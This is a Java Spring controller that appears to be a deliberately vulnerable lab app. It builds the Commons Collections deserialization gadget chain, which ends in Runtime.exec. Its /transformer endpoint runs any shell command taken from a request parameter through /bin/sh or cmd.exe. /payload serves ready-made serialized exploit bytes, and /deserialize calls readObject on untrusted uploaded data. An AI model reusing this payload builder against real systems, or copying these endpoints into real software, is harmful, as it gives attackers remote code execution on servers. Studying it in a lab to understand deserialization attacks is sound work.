package myapp;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.RequestBody;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

@RestController
public class TransformerController {

    @GetMapping("/transformer")
    public String execute(@RequestParam String command) {
        try {
            byte[] serialized = buildSerializedPayload(command);
            deserialize(serialized);
            return formatExecutionResult("Commons Collections 反序列化链已触发", serialized.length);
        } catch (Exception e) {
            return "Error executing command: " + e.getMessage();
        }
    }

    @GetMapping("/payload")
    public byte[] payload(@RequestParam String command) throws Exception {
        return buildSerializedPayload(command);
    }

    @PostMapping(value = "/deserialize", consumes = "application/x-java-serialized-object")
    public String deserializePayload(@RequestBody byte[] serialized) {
        try {
            deserialize(serialized);
            return formatExecutionResult("外部上传的序列化字节流已触发反序列化", serialized.length);
        } catch (Exception e) {
            return "Error executing serialized payload: " + e.getMessage();
        }
    }

    @GetMapping("/status")
    public String status() throws IOException {
        return "marker_exists=" + markerFile().exists()
                + ", output_exists=" + outputFile().exists()
                + ", output_preview=" + readPreview(outputFile());
    }

    private Object buildCommonsCollectionsPayload(String command) throws Exception {
        Transformer[] inert = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String[].class},
                        new Object[]{buildCommandArray(command)}),
                new ConstantTransformer(1),
        };

        ChainedTransformer transformerChain = new ChainedTransformer(inert);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException payload = new BadAttributeValueExpException(null);
        Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(payload, entry);

        Field transformerField = ChainedTransformer.class.getDeclaredField("iTransformers");
        transformerField.setAccessible(true);
        transformerField.set(transformerChain, transformers);
        lazyMap.clear();
        return payload;
    }

    private byte[] buildSerializedPayload(String command) throws Exception {
        return serialize(buildCommonsCollectionsPayload(command));
    }

    private byte[] serialize(Object value) throws IOException {
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
        objectOutputStream.writeObject(value);
        objectOutputStream.flush();
        objectOutputStream.close();
        return outputStream.toByteArray();
    }

    private void deserialize(byte[] serialized) throws IOException, ClassNotFoundException {
        ObjectInputStream inputStream = new ObjectInputStream(new ByteArrayInputStream(serialized));
        inputStream.readObject();
        inputStream.close();
    }

    private String[] buildCommandArray(String command) {
        String osName = System.getProperty("os.name", "").toLowerCase();
        if (osName.contains("win")) {
            return new String[]{"cmd.exe", "/c", command};
        }
        return new String[]{"/bin/sh", "-c", command};
    }

    private File markerFile() {
        return new File("/tmp/collections-success");
    }

    private File outputFile() {
        return new File("/tmp/collections-output");
    }

    private String readPreview(File file) throws IOException {
        if (!file.exists()) {
            return "";
        }
        byte[] content = java.nio.file.Files.readAllBytes(file.toPath());
        String text = new String(content, java.nio.charset.StandardCharsets.UTF_8);
        return text.length() > 200 ? text.substring(0, 200) : text;
    }

    private String formatExecutionResult(String prefix, int serializedLength) {
        return prefix
                + "。serialized_bytes=" + serializedLength
                + ", marker_exists=" + markerFile().exists()
                + ", output_exists=" + outputFile().exists();
    }
}
